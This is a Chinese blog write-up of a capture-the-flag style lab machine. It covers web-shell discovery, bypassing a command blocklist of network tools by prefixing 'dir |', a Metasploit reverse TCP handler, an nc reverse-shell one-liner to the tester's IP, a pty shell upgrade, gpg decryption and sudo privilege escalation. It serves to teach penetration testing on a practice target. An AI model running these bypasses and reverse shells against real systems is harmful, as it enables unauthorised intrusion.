JIS-CTF BOB靶机渗透笔记

  • 网络安全

这个靶机相比于上一个可以说是很难了，上一个是网站源代码里面就有账号密码，而且上传漏洞就摆在那里，没什么难度，不多说，先附上下载链接 ,密码：gyy1，接着就是不正式的开始了（笑）

信息收集

靶机都是没有给你IP地址的，我通过扫网段的方式得到了，所以直接看看有什么服务

只有一个80（不知道还有没有别的，通过改端口使得nmap扫不到），直接登网站看看有什么

开始渗透

可以说是很简陋了，网站先都浏览一遍，看看有没有什么有意思的

emmmmmm，不给登录，也没有注册，估计还是得爬一下网站子目录了，开启burpsuite

很意外，找到了个shell的php文件，可以执行命令

先输入ls看看有什么文件

可以说是很嘲讽了，网站屏蔽了特殊的字符，随便输入了几个命令可以推断出它屏蔽的是以下几个

pwd
ls
netcat
ssh
wget
ping
cat
nc

很优秀，防止wget下载php木马，nc开启端口，可以说是很用心良苦了，但是很简答就能绕过，而且dir也能用，那么就开始绕过，因为他是只检测前面的，所以你前面不要出现这些就好了，看路径的正确例子

dir | pwd


成功绕过后，开始想办法回弹shell吧，我这里用的方法还是使用handler，先设置好模块

msf > use exploit/multi/handler 
msf exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.201
lhost => 192.168.1.201
msf exploit(multi/handler) > set lport 4444
lport => 4444
msf exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 192.168.1.201:4444

接着在网站建立一个反向shell

dir | nc 192.168.1.201 4444 -e /bin/bash


这个时候我就得到了一个反向shell了，为了获得交互式shell，这里用个新鲜的命令

run
python -c 'import pty; pty.spawn("/bin/bash")'


这样就方便看当前路径了，开始干活，先逛一逛home目录（用户目录），在用户elliots的目录下看到一个theadminisdumb.txt，有点奇怪，cat一下

找到了用户elliots的密码是theadminisdumb，在去别的用户的目录逛一逛，进入用户bob的目录，ls -a一下看看有没有隐藏的文件

可以，找到了个.old_passwordfile.html，看看内容有什么好东西

看不懂是什么东西。。算了，先记着，在主文件夹Ducuments下发现一个gpg加密的文件，cat一下导致卡住了。被迫重新反弹一个shell，后来百度才知道，gpg是加密的，而且要有对应的公钥

确定了一个思路，那就是这电脑里有公钥的提示，到处逛一逛看看能不能找到，看到目录下还有一个文件夹，Secret，这里可以说作者非常恶意了，因为你要进差不多4个文件夹才到头

最后看到了一个sh文件，先cat一下看看内容

密码的提示应该就是这个了，HARPOCRATES，和藏头诗一样，每一行的首字母组成一个单词，HARPOCRATES中文名是哈尔波克拉特斯(翻译来的，是不是这个我也不知道)，是希腊代表秘密和保密的神，接着用这个公钥来解密刚才的gpg文件

可以看到密码是b0bcat_(这里要注意一下，www-data是没有权限来解密的，所以你得用一开始找到的用户elliots的密码来切换到elliots，然后再解密，)下面是解密格式

gpg --batch --passphrase <公钥> -d <文件>

接着我们用刚得到的密码切换至bob用户，但是bob是没有权限进入root目录的，所以这里用sudo bash来升级成root

开始找flag.txt文件吧

find / -name flag.txt


发现flag.txt文件，直接查看

结束

这个靶机可以说是很有意思了，确实跟真的环境差不多吧，而且还有一个非常有意思的东西，你在webshell那里尝试echo写一个php木马的时候，他会回显一个这个玩意

最后说一句，真是太好玩了哈哈哈哈哈哈
